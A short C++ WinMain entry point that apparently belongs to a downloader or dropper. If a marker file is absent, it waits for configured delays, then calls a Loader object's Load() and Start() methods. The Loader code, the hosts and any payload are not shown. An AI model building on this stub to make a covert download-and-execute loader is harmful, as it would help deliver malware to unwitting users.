#include "Loader.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	Loader* loader = new Loader();
	
	if (GetFileAttributesA(Unloading_Path) == 0xFFFFFFFF) {
		Sleep(Download_Delay); loader->Load();
		Sleep(Unloading_Delay); loader->Start();
	}
}
